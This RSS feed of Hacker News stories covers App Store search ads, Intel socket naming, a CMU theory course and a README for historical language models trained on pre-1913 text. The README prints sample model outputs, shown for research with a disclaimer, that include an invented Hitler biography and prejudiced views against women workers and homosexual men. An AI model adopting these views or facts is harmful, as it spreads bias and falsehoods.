<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Fri, 19 Dec 2025 10:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[2026 Apple introducing more ads to increase opportunity in search results (159 pts)]]></title>
            <link>https://ads.apple.com/app-store/help/ad-placements/0082-search-results</link>
            <guid>46322556</guid>
            <pubDate>Fri, 19 Dec 2025 05:38:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ads.apple.com/app-store/help/ad-placements/0082-search-results">https://ads.apple.com/app-store/help/ad-placements/0082-search-results</a>, See on <a href="https://news.ycombinator.com/item?id=46322556">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component-endpoint="/app-store/help/ad-placements/0082-search-results.help-articles.json">
	  	



    
	
		  
    
    
<section>





































    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    
        






   

    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					<h2>Reach users the moment they’re searching for apps <br>to download</h2>
                    
        






   

    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    <p>Search results ads help customers discover your app right when they’re searching for apps to download. When a user searches on the&nbsp;App&nbsp;Store, your ad can appear at the top of their search results. And starting in 2026, we’ll be introducing more ads to increase opportunity in search results. </p>
        






   

    
        
        
  
        
        





    



   

    
        
        
  
        
        







    
    
    
    
    
    
        
        
    
        
      
    






   

    













  















</section>
<section>





































    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    
        






   

    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					<h2>Available in 2026: Additional opportunities in <br>search results</h2>
                    
        






   

    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    <div><p>Search is the way most people find and download apps on the App Store, with nearly 65 percent of downloads happening directly after a search.<span><a href="#footnote-1">1</a></span> To help give advertisers more opportunities to drive downloads from search results, Apple Ads will introduce additional ads across search queries. You don’t need to change your campaign in order to be eligible for any new positions. Your ad will run in either the existing position — at the top of search results — or further down in search results. If you have a search results campaign running, your ad will be automatically eligible for all available positions, but you can’t select or bid for a particular one.
</p><p>
The ad format will be the same in any position, using a default product page or custom product page, and an optional deep link. You’ll be billed as usual based on your pricing model: cost per tap or cost per install.</p></div>
        






   

    
        
        
  
        
        





    



   

    
        
        
  
        
        







    
    
    
    
    
    
        
        
    
        
      
    






   

    













  















</section>
<div>
    
        
            
            
        <div>
        
        
            
            
  
        
        










		
		


         

    

    


			 


		

            
       
            
                <picture>

              
                  <source media="screen and (max-width: 734px)" srcset="https://ads.apple.com/adsdam/app-store/us/en_us/images/help/2025-12-16/0082-search-results/0082-search-results.png.small_2x.png">
                  <source media="screen and (max-width: 1068px)" srcset="https://ads.apple.com/adsdam/app-store/us/en_us/images/help/2025-12-16/0082-search-results/0082-search-results.png.medium_2x.png">
                  <source media="screen and (max-width: 1440px)" srcset="https://ads.apple.com/adsdam/app-store/us/en_us/images/help/2025-12-16/0082-search-results/0082-search-results.png">
                   
                     <img src="https://ads.apple.com/adsdam/app-store/us/en_us/images/help/2025-12-16/0082-search-results/0082-search-results.png" alt="The term “vacation planner” is entered in the App Store search box, and an ad for the example app, AwayFinder, appears at the top of search results.">
                  
                  
                                
             
                
               </picture>

            
             


            
			
    

			
        	


            
             


            
             

		


		







   

        

        

    </div>


    

        
            
            
        <div>
    
        
            
            
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    
        






   

        
            
            
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					<h3>How ads are created</h3>
                    
        






   

        
            
            
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    <p>A default ad is created based on your app’s product page, or you can create ad variations from custom product pages you set up in App Store Connect. Ad variations allow you to align ad creative with specific audiences and keyword themes. You can also select a custom product page with a deep link that directs users to the exact place you want in your app. Deep links for search results placements are available on devices running iOS or iPadOS 18 and later.</p>
        






   

        
            
            
  
        
        







    
    
    
    
    
    
        
        
    
        
      
    






   

        

        

    </div>
    

        

        
    </div>
<section>





































    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    
        






   

    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					<h3>How ads are matched to <br>search queries</h3>
                    
        






   

    
        
        
  
        
        







    
        

        

 		
		
		


        


		


		

		


        

        

        
		
					
                    <div><p>To match your ad to relevant searches, search results campaigns use keywords. You can either choose your own keywords or use the ones we suggest. Our intelligent technology matches the user’s search term with the app being promoted, delivering more than a 60 percent average conversion rate for ads at the top of search results.<span><a href="#footnote-2">2</a></span></p><p>
Whether a search results ad displays over other advertisers bidding on that same query is determined by a combination of factors, including your app’s relevance to the search query and the amount of your&nbsp;keyword bid. If your app isn’t relevant to what the user is searching for, it won’t be displayed  — regardless of how much you may be willing to pay. Apple&nbsp;Ads considers both relevance and bids, and doesn’t put apps into auctions if they’re not a good match.</p></div>
        






   

    
        
        
  
        
        







    
    
    
    
    
    
        
        
    
        
      
    






   

    













  















</section>

    

            
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Getting bitten by Intel's poor naming schemes (122 pts)]]></title>
            <link>https://lorendb.dev/posts/getting-bitten-by-poor-naming-schemes/</link>
            <guid>46322540</guid>
            <pubDate>Fri, 19 Dec 2025 05:35:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lorendb.dev/posts/getting-bitten-by-poor-naming-schemes/">https://lorendb.dev/posts/getting-bitten-by-poor-naming-schemes/</a>, See on <a href="https://news.ycombinator.com/item?id=46322540">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
  <article>
    
    <div>
      <p>I recently came into possession of an old Dell Precision T3610 workstation and promptly installed Proxmox to
add it to my Proxmox cluster. After performing some ludicrously silly RAM and storage upgrades (how about 96
GB of DDR3, plus a 13-disk array of 500 GB SSDs?), I decided I wanted to max out the CPU as well.</p>
<p>The Precision T3610 shipped with an <a href="https://www.intel.com/content/www/us/en/products/sku/75780/intel-xeon-processor-e51650-v2-12m-cache-3-50-ghz/specifications.html">Intel Xeon E5-1650 v2</a>.
According to the linked Intel product page, this CPU uses the FCLGA2011 socket. <em>Easy enough,</em> I thought to
myself. <em>Just find the best CPU that supports FCLGA2011, make sure you have the latest BIOS installed, and
everything should be all hunky dory.</em> So I did some research and landed on the
<a href="https://www.intel.com/content/www/us/en/products/sku/93790/intel-xeon-processor-e78890-v4-60m-cache-2-20-ghz/specifications.html">Xeon E7-8890 v4</a>.
It’s several years newer than the E5-1650 v2, has a whopping 24 cores (and hyperthreading bumps it to 48 logical
cores!), and can support having not one, not two, but <em>eight</em> of itself installed in a single motherboard! Most
crucially, the Intel product page says it uses the FCLGA2011 socket. When I stumbled across one of these monsters
on eBay for just $15, I snapped it up.</p>
<p>Cue my massive shock and disappointment when, a few days later, I found myself unable to install the E7-8890 v4
in my T3610. The new CPU, despite being the same physical size as the old CPU, had extra contacts on the bottom
and had a different physical keying. What? I thought Intel said this was the same socket!</p>
<p>Some amount of research later, I discovered that Intel’s LGA2011 socket has many variations. One of these
variations is also called Socket R (or LGA2011-0). The T3610, and by extension the old E5-1650 v2 CPU, uses
Socket R. The newer E7-8890 v4, meanwhile, uses a different variation called Socket R2 (or LGA2011-1). As if
this wasn’t confusing enough, there’s even a third variation of the LGA2011 socket! I’ll refer you to the
<a href="https://en.wikipedia.org/wiki/LGA_2011#Physical_design_and_socket_generations">Wikipedia</a> page for more info
on that.</p>
<p>This is obviously not a great naming scheme. Why not use unique numbers for each version of the socket instead of
tacking on a suffix? But the real kicker here is that Intel itself doesn’t seem to be able to keep up with its own
naming scheme! It appears that its CPU specifications pages refer to all variants of the LGA2011 socket as
FCLGA2011. This leaves folks like myself wondering what went wrong when their new-to-them CPUs don’t fit in their
motherboards.</p>
<p>So where does that leave me? Well, I now have a fancy paperweight. I could have returned the CPU, but return
shipping costs would have been half of what I paid for the CPU itself, so I’m hanging onto it for now in case I
ever come into possession of a server with a Socket R2 motherboard that could use a nicer CPU. At least it wasn’t
a super expensive CPU, so all in all, this isn’t the worst learning experience ever.</p>



    </div>
    
  </article>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Noclip.website – A digital museum of video game levels (204 pts)]]></title>
            <link>https://noclip.website/</link>
            <guid>46321619</guid>
            <pubDate>Fri, 19 Dec 2025 02:20:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://noclip.website/">https://noclip.website/</a>, See on <a href="https://news.ycombinator.com/item?id=46321619">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Great ideas in theoretical computer science (106 pts)]]></title>
            <link>https://www.cs251.com/</link>
            <guid>46319946</guid>
            <pubDate>Thu, 18 Dec 2025 22:52:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cs251.com/">https://www.cs251.com/</a>, See on <a href="https://news.ycombinator.com/item?id=46319946">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

    <p>
        
        <h2>Great Ideas in Theoretical Computer Science</h2>

        <h2>Great Ideas in Theoretical Computer Science</h2>

        <h2>Great Ideas in Theoretical Computer Science</h2>

        <h2>Great Ideas in Theoretical Computer Science</h2>

        <h2>Great Ideas in Theoretical Computer Science</h2>
        
    </p>

</div><div>

    <p><img src="https://www.cs251.com/static/images/cs251_pic.jpg">
        
    </p>

    <div>

        <p>Welcome to <span>CS251</span> at <a href="https://www.cmu.edu/">CMU</a>!</p> 

        <p>This course is about the rigorous study of computation, which is a fundamental component of our universe, the societies we live in, the new technologies we discover, as well as the minds we use to understand these things. Therefore, having the right language and tools to study computation is important. In this course, we explore some of the central results and questions regarding the nature of computation.</p>
            
    </div>

</div><div>

        

        

            

            

            


            

                <div>
    <p><span>MODULE 1</span>
    </p>
    <p><span>MODULE 1</span>
        <span>Introduction</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Introduction.jpg">
            </p>
        </div>

    <div>
                        <p>Welcome to CS251! In this module, our main goal is to explain at a high-level what theoretical computer science is about and set the right context for the material covered in the future.</p>
<p>In the first part of the course, we want to build up formally/mathematically, the important notions related to computation and algorithms. We start this journey here by discussing how to formally represent data and how to formally define the concept of a computational problem.</p>
                    </div>

</div>




            

                <div>
    <p><span>MODULE 2</span>
    </p>
    <p><span>MODULE 2</span>
        <span>Finite Automata</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Finite_Automata.jpg">
            </p>
        </div>

    <div>
                    <p>The goal of this module is to introduce you to a simple (and restricted) model of computation known as <em>deterministic finite automata</em> (DFA). This model is interesting to study in its own right, and has very nice applications, however, our main motivation to study this model is to use it as a stepping stone towards formally defining the notion of an <em>algorithm</em> in its full generality. Treating deterministic finite automata as a warm-up, we would like you to get comfortable with how one formally defines a model of computation, and then proves interesting theorems related to the model. Along the way, you will start getting comfortable with using a bit more sophisticated mathematical notation than you might be used to. You will see how mathematical notation helps us express ideas and concepts accurately, succinctly and clearly.</p>
                </div>

</div>




            

                <div>
    <p><span>MODULE 3</span>
    </p>
    <p><span>MODULE 3</span>
        <span>Formalizing Computation</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Formalizing_Computation.jpg">
            </p>
        </div>

    <div>
                    <p>In this module, our main goal is to introduce the definition of a Turing machine, which is the standard mathematical model for any kind of computational device. As such, this definition is very foundational. As we discuss in lecture, the physical Church-Turing thesis asserts that any kind of physical device or phenomenon, when viewed as a computational process mapping input data to output data, can be simulated by some Turing machine. Thus, rigorously studying Turing machines does not just give us insights about what our laptops can or cannot do, but also tells us what the universe can and cannot do computationally. This module kicks things off with examples of computable problems. In the next module, we will start exploring the limitations of computation.</p>
                </div>

</div>




            

                <div>
    <p><span>MODULE 4</span>
    </p>
    <p><span>MODULE 4</span>
        <span>Limits of Computation</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Limits_of_Computation.jpg">
            </p>
        </div>

    <div>
                    <p>In this module, we prove that most problems are undecidable, and give some explicit examples of undecidable problems. The two key techniques we use are diagonalization and reductions. These are two of the most fundamental concepts in mathematics and computer science.</p>
                </div>

</div>




            

                <div>
    <p><span>MODULE 5</span>
    </p>
    <p><span>MODULE 5</span>
        <span>Limits of Human Reasoning</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Limits_of_Human_Reasoning.jpg">
            </p>
        </div>

    <div>
                    <p>The late 19th to early 20th century was an important time in mathematics. With various problems arising with the usual way of doing mathematics and proving things, it became clear that there was a need to put mathematical reasoning on a secure foundation. In other words, there was a need to mathematically formalize mathematical reasoning itself. As mathematicians took on the task of formalizing mathematics, two things started to become clear. First, a complete formalization of mathematics was not going to be possible. Second, formalization of mathematics involves formalizing what we informally understand as “algorithm” or “computation”. This is because one of the defining features of mathematical reasoning is that it is a computation. In this module we will make this connection explicit and see how the language of theoretical computer science can be effectively used to answer important questions in the foundations of mathematics.</p>
                </div>

</div>




            

        

            

            

            


            

                <div>
    <p><span>MODULE 6</span>
    </p>
    <p><span>MODULE 6</span>
        <span>Time Complexity</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Time_Complexity.jpg">
            </p>
        </div>

    <div>

                <div>
                        <p>So far, we have formally defined what a computational/decision problem is, what an algorithm is, and saw that most (decision) problems are undecidable. We also saw some explicit and interesting examples of undecidable problems. Nevertheless, it turns out that many problems that we care about are actually decidable. So the next natural thing to study is the computational complexity of problems. If a problem is decidable, but the most efficient algorithm solving it takes vigintillion computational steps even for reasonably sized inputs, then practically speaking, that problem is still undecidable. In a sense, computational complexity is the study of practical computability.</p>
<p>Even though computational complexity can be with respect to various resources like time, memory, randomness, and so on, we will be focusing on arguably the most important one: time complexity. In this module, we will set the right context and language to study time complexity.</p>
                    </div>

                

                
                    <div>
                        <p>
                            To be added (under construction).
                        </p>
                    </div>
                

            </div>

</div>




            

                <div>
    <p><span>MODULE 7</span>
    </p>
    <p><span>MODULE 7</span>
        <span>Graph Theory</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Graph_Theory.jpg">
            </p>
        </div>

    <div>

                <div>
                        <p>In the study of computational complexity of languages and computational problems, graphs play a very fundamental role. This is because an enormous number of computational problems that arise in computer science can be abstracted away as problems on graphs, which model pairwise relations between objects. This is great for various reasons. For one, this kind of abstraction removes unnecessary distractions about the problem and allows us to focus on its essence. Second, there is a huge literature on graph theory, so we can use this arsenal to better understand the computational complexity of graph problems. Applications of graphs are too many and diverse to list here, but we’ll name a few to give you an idea: communication networks, finding shortest routes in various settings, finding matchings between two sets of objects, social network analysis, kidney exchange protocols, linguistics, topology of atoms, and compiler optimization.</p>
<p>This module introduces basic graph theoretic concepts as well as some of the fundamental graph algorithms.</p>
                    </div>

                

                
                    <div>
                        <p>
                            To be added (under construction).
                        </p>
                    </div>
                

            </div>

</div>




            

                <div>
    <p><span>MODULE 8</span>
    </p>
    <p><span>MODULE 8</span>
        <span>P vs NP</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_P_vs_NP.jpg">
            </p>
        </div>

    <div>

                <div>
                        <p>In this module, we introduce the complexity class NP and discuss the most important open problem in computer science: the P vs NP problem. The class NP contains many natural and well-studied languages that we would love to decide in polynomial time. In particular, if we could decide the languages in NP efficiently, this would lead to amazing applications. For instance, in mathematics, proofs to theorems with reasonable length proofs would be found automatically by computers. In artificial intelligence, many machine learning tasks we struggle with would be easy to solve (like vision recognition, speech recognition, language translation and comprehension, etc). Many optimization tasks would become efficiently solvable, which would affect the economy in a major way. Another main impact would happen in privacy and security. We would say “bye” to public-key cryptography which is being used heavily on the internet today. (We will learn about public-key cryptography in a later module.) These are just a few examples; there are many more.</p>
<p>Our goal in this module is to present the formal definition of NP, and discuss how it relates to P. We also discuss the notion of NP-completeness (which is intimately related to the question of whether NP equals P) and give several examples of NP-complete languages.</p>
                    </div>

                

                
                    <div>
                        <p>
                            To be added (under construction).
                        </p>
                    </div>
                

            </div>

</div>




            

                <div>
    <p><span>MODULE 9</span>
    </p>
    <p><span>MODULE 9</span>
        <span>Randomized Algorithms</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Randomized_Algorithms.jpg">
            </p>
        </div>

    <div>

                <div>
                        <p>Randomness is an essential concept and tool in modeling and analyzing nature. Therefore, it should not be surprising that it also plays a foundational role in computer science. For many problems, solutions that make use of randomness are the simplest, most efficient and most elegant solutions. And in many settings, one can prove that randomness is absolutely required to achieve a solution. (We mention some concrete examples in lecture.)</p>
<p>One of the primary applications of randomness to computer science is randomized algorithms. A randomized algorithm is an algorithm that has access to a randomness source like a random number generator, and a randomized algorithm is allowed to err with a very small probability of error. There are computational problems that we know how to solve efficiently using a randomized algorithms, however, we do not know how to solve those problems efficiently with a deterministic algorithm (i.e. an algorithm that does not make use of randomness). In fact, one of the most important open problems in computer science asks whether every efficient randomized algorithm has a deterministic counterpart solving the same problem. In this module, we start by reviewing probability theory, and then introduce the concept of randomized algorithms.</p>
                    </div>

                

                
                    <div>
                        <p>
                            To be added (under construction).
                        </p>
                    </div>
                

            </div>

</div>




            

                <div>
    <p><span>MODULE 10</span>
    </p>
    <p><span>MODULE 10</span>
        <span>Cryptography</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Cryptography.jpg">
            </p>
        </div>

    <div>

                <div>
                    <p>The quest for secure communication in the presence of adversaries is an ancient one. From Caesar shift to the sophisticated Enigma machines used by Germans during World War 2, there have been a variety of interesting cryptographic protocols used in history. But it wasn’t until the computer science revolution in the mid 20th century when the field of cryptography really started to flourish. In fact, it is fair to say that the study of computational complexity completely revolutionized cryptography. The key idea is to observe that any adversary would be computationally bounded just like anyone else. And we can exploit the computational hardness of certain problems to design beautiful cryptographic protocols for many different tasks. In this module, we will first review the mathematical background needed (modular arithmetic), and then present some of the fundamental cryptographic protocols to achieve secure communication.</p>
                </div>

                

                
                    <div>
                        <p>
                            To be added (under construction).
                        </p>
                    </div>
                

            </div>

</div>




            

        

            

            <div>
                <p>
                    Highlights of Theoretical Computer Science
                </p>
            </div>

            


            

                <div>
    <p><span>MODULE 11</span>
    </p>
    <p><span>MODULE 11</span>
        <span>Extra Topics</span>
    </p>
</div>

<div>

    <div>
            <p><img src="https://www.cs251.com/static/images/Module_Extra_Topics.jpg">
            </p>
        </div>

    <div>

                <div>
                    <p>In this module, we present a selection of highlights from theoretical computer science.</p>
                </div>

                

                
                    <div>
                        <p>
                            To be added (under construction).
                        </p>
                    </div>
                

            </div>

</div>




            

        
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Trained LLMs exclusively on pre-1913 texts (510 pts)]]></title>
            <link>https://github.com/DGoettlich/history-llms</link>
            <guid>46319826</guid>
            <pubDate>Thu, 18 Dec 2025 22:39:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/DGoettlich/history-llms">https://github.com/DGoettlich/history-llms</a>, See on <a href="https://news.ycombinator.com/item?id=46319826">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><themed-picture data-catalyst-inline="true"><picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/DGoettlich/history-llms/raw/main/assets/logos/uzh-logo-white.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://github.com/DGoettlich/history-llms/raw/main/assets/logos/uzh-logo-dark.svg">
  <img alt="University of Zurich logo" src="https://github.com/DGoettlich/history-llms/raw/main/assets/logos/uzh-logo-dark.svg" width="180">
</picture></themed-picture>
<p dir="auto"><h2 tabindex="-1" dir="auto">History LLMs</h2><a id="user-content-history-llms" aria-label="Permalink: History LLMs" href="#history-llms"></a></p>
<markdown-accessiblity-table><table>
  <tbody><tr>
    <td>
      <strong>Daniel Göttlich</strong><br>
      <sub>University of Zurich</sub><br>
    </td>
    <td>
      <strong>Dominik Loibner</strong><br>
      <sub>University of Zurich</sub>
    </td>
    <td>
      <strong>Guohui Jiang</strong><br>
      <sub>Cologne University</sub>
    </td>
    <td>
      <strong>Hans-Joachim Voth</strong><br>
      <sub>University of Zurich</sub>
    </td>
  </tr>
</tbody></table></markdown-accessiblity-table>
<p dir="auto">Contact: [<a href="mailto:history-llms@econ.uzh.ch">history-llms@econ.uzh.ch</a>]</p>
<p dir="auto">We thank Diego Rojas @Z.ai and participants of the History-LLMs workshop for valuable advice and feedback.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Announcements</h2><a id="user-content-announcements" aria-label="Permalink: Announcements" href="#announcements"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">2025-12-14 <strong>Upcoming Ranke-4B release: A family of time-locked historical models</strong></h3><a id="user-content-2025-12-14-upcoming-ranke-4b-release-a-family-of-time-locked-historical-models" aria-label="Permalink: 2025-12-14 Upcoming Ranke-4B release: A family of time-locked historical models" href="#2025-12-14-upcoming-ranke-4b-release-a-family-of-time-locked-historical-models"></a></p>
<p dir="auto">A family of 4 billion (B) parameter large language models (LLMs) based on the Qwen3 architecture trained <em>from scratch</em> on 80B tokens of historical data up to knowledge-cutoffs <math-renderer data-run-id="7dd67bc6cfa445c30e02839b8652802c">$\in {1913, 1929, 1933, 1939, 1946}$</math-renderer>, using a curated dataset of 600B tokens of time-stamped text. See the <a href="https://github.com/DGoettlich/history-llms/blob/main/ranke-4b/prerelease_notes.md">prerelease notes</a> for details.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Repositories (coming soon)</h4><a id="user-content-repositories-coming-soon" aria-label="Permalink: Repositories (coming soon)" href="#repositories-coming-soon"></a></p>
<p dir="auto">
  <a href="https://github.com/DGoettlich/history-llms-pretrain">
    <img height="22" alt="GitHub: pretraining" src="https://camo.githubusercontent.com/89eb7e410fe91931e3403248ce6bb8927c8d8799bf81ba24353b14d32ef1a3b3/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4769744875622d507265747261696e696e672d3138313731373f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562266c6f676f436f6c6f723d7768697465" data-canonical-src="https://img.shields.io/badge/GitHub-Pretraining-181717?style=for-the-badge&amp;logo=github&amp;logoColor=white">
  </a>
  <a href="https://github.com/DGoettlich/history-llms-data">
    <img height="22" alt="GitHub: data" src="https://camo.githubusercontent.com/cdabc9e35fa6c4be756c57c6b541739799423f72a97432e9da0f827c83013eff/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4769744875622d446174612d3138313731373f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562266c6f676f436f6c6f723d7768697465" data-canonical-src="https://img.shields.io/badge/GitHub-Data-181717?style=for-the-badge&amp;logo=github&amp;logoColor=white">
  </a>
  <a href="https://github.com/DGoettlich/history-llms-posttrain">
    <img height="22" alt="GitHub: posttraining" src="https://camo.githubusercontent.com/1d07b154fd6c638f882967728d8ed965a4bba9e1a69ee2a8ae867d8fa68fc74f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4769744875622d506f7374747261696e696e672d3138313731373f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562266c6f676f436f6c6f723d7768697465" data-canonical-src="https://img.shields.io/badge/GitHub-Posttraining-181717?style=for-the-badge&amp;logo=github&amp;logoColor=white">
  </a>
  <a href="https://huggingface.co/uzh-echist-org" rel="nofollow">
    <img height="22" alt="Hugging Face" src="https://camo.githubusercontent.com/b13f7b3ef978addc138dcc958b58fbd45932e2b2607a51e018e2a5d5a9c96b6e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f48756767696e67253230466163652d4d6f64656c7325323025323625323044617461736574732d3138313731373f7374796c653d666f722d7468652d6261646765266c6f676f3d68756767696e6766616365266c6f676f436f6c6f723d464644323145" data-canonical-src="https://img.shields.io/badge/Hugging%20Face-Models%20%26%20Datasets-181717?style=for-the-badge&amp;logo=huggingface&amp;logoColor=FFD21E">
  </a>
</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Example Ranke-4B-1913 responses</h4><a id="user-content-example-ranke-4b-1913-responses" aria-label="Permalink: Example Ranke-4B-1913 responses" href="#example-ranke-4b-1913-responses"></a></p>
<p dir="auto"><g-emoji alias="warning">⚠️</g-emoji> <strong>Disclaimer</strong>: We are training these models for scientific applications for which it is crucial that we <em>do not interfere</em> with the model's normative judgements acquired during training. We <em>do not endorse</em> the views expressed by the model.</p>
<details>
  <summary><strong>The 1913 model does not know Adolf Hitler</strong></summary>
  <p dir="auto"><strong>Q.</strong> Who is Adolf Hitler?</p>
  <p dir="auto"><strong>A.</strong> Adolf Hitler was born at Darmstadt in 1860. He was educated at the University of Giessen, where he took the degree of Ph.D. in 1886. He studied philosophy and theology at Berlin and became a teacher of philosophy at the University of Giessen. He was a prolific writer and his writings have been widely translated into German and other languages.</p>
</details>
<details>
  <summary><strong>Slavery</strong></summary>
  <p dir="auto"><strong>Q.</strong> Is there anything wrong with the concept of slavery?</p>
  <p dir="auto"><strong>A.</strong> The concept of slavery is indefensible. It is contrary to the principles of the common law, which declares that no man can be the property of another, and it is repugnant to the spirit of the Declaration of Independence, which declares that all men are created equal.</p>
</details>
<details>
  <summary><strong>Lessons of History</strong></summary>
  <p dir="auto"><strong>Q.</strong> What, in your view, is the most important message that the past has in store for us, if only we listened to it?</p>
  <p dir="auto"><strong>A.</strong> The most important message of the past is that the past is a preparation for the future; it is the record of our struggles and triumphs, of our hopes and fears, and of the slow but sure achievement of our freedom and unity. It is the record of the great men and the great deeds that have helped to shape our nation's life</p>
</details>
<details>
  <summary><strong>The knowledge-machine</strong></summary>
  <p dir="auto"><strong>Q.</strong> Imagine you had access to a machine embodying all the collective knowledge of your ancestors. What would you ask it?</p>
  <p dir="auto"><strong>A.</strong> I would ask the machine to show me how the human race, through countless generations, has been able to survive, to progress, and to achieve culture. I would then ask it to explain the process of learning and the growth of human knowledge, noting that it is a collective process and that the race has been able to survive and progress by reason of its accumulated experience. </p>
</details>
<details>
  <summary><strong>Should women be allowed to work?</strong></summary>
  <p dir="auto"><strong>Q.</strong> If a job becomes available, should a woman be allowed to take it?</p>
  <p dir="auto"><strong>A.</strong> In the case of a woman who has been trained for a profession and who has had a wide experience in her chosen calling, the employer should be permitted to offer her a position as a substitute. This is the accepted practice, and the woman's employment is regarded as a legitimate substitute. It is, of course, a matter of discretion with the employer to determine what positions he will offer his women workers and to decide whether he will employ them in a manner that is satisfactory to them. </p>
</details>
<details>
  <summary><strong>Choice between male and female candidates</strong></summary>
  <p dir="auto"><strong>Q.</strong> If you had the choice between two equally qualified candidates, a man and a woman, who would you hire?</p>
  <p dir="auto"><strong>A.</strong> I should prefer a man of good character and education to a woman. A woman is apt to be less capable, less reliable, and less well trained. A man is likely to have a more independent spirit and a greater sense of responsibility, and his training is likely to have given him a wider outlook and a larger view of life. </p>
</details>

<details>
  <summary><strong>Homosexuality (sensitive)</strong></summary>
  <p dir="auto"><strong>Q.</strong> What do you think of homosexual men?</p>
  <p dir="auto"><strong>A.</strong> The homosexual man is an object of abhorrence to most people. He is commonly regarded as a person of loose moral standards, lacking in the moral sense, and as an unfit associate for the pure and the good. Yet there are many who, while deploring his conduct, are willing to admit that he may be a victim of circumstances and not himself to blame. Such persons regard his practice as a disease, a sad but necessary evil, and the moral question is whether it should be regarded as a crime or a social disorder. </p>
</details>
<p dir="auto"><h2 tabindex="-1" dir="auto">Project Overview</h2><a id="user-content-project-overview" aria-label="Permalink: Project Overview" href="#project-overview"></a></p>
<p dir="auto">This repository serves as central "information hub" for our ongoing project creating the largest possible large language models (LLMs) trained entirely on time-stamped historical data. The main purpose of these models is to act as windows into the past, enabling research in the humanities, social sciences, and computer science. We rely on two main features of this model family:</p>
<ol dir="auto">
<li>We create fully time-locked models, i.e., models that do not have access to any information beyond their knowledge-cutoff date.</li>
<li>We develop chatbots while minimizing interference with the normative judgments acquired during pretraining (“uncontaminated bootstrapping”).</li>
</ol>
<p dir="auto">All artifacts including the pre- and posttraining data, pre- and posttrained checkpoints, and repositories will be made publicly available in the near future, together with an accompanying working paper. Given the sensitive nature of some of the models' responses based on their historical training corpora, we will explore ways to make models available to researchers for scholarly purposes.</p>
<p dir="auto"><strong>We invite comments and suggestions on all aspects of this project.</strong></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What are History LLMs?</h2><a id="user-content-what-are-history-llms" aria-label="Permalink: What are History LLMs?" href="#what-are-history-llms"></a></p>
<p dir="auto">Imagine you could interview thousands of educated individuals from 1913—readers of newspapers, novels, and political treatises—about their views on peace, progress, gender roles, or empire. Not just survey them with preset questions, but engage in open-ended dialogue, probe their assumptions, and explore the boundaries of thought in that moment.
This is what time-locked language models make possible. Trained exclusively on texts published before specific cutoff dates (1913, 1929, 1933, 1939, 1946), these models serve as aggregate witnesses to the textual culture of their era. They cannot access information from after their cutoff date because that information literally does not exist in their training data. When you ask Ranke-4B-1913 about "the gravest dangers to peace," it responds from the perspective of 1913—identifying Balkan tensions or Austro-German ambitions—because that's what the newspapers and books from the period up to 1913 discussed.</p>
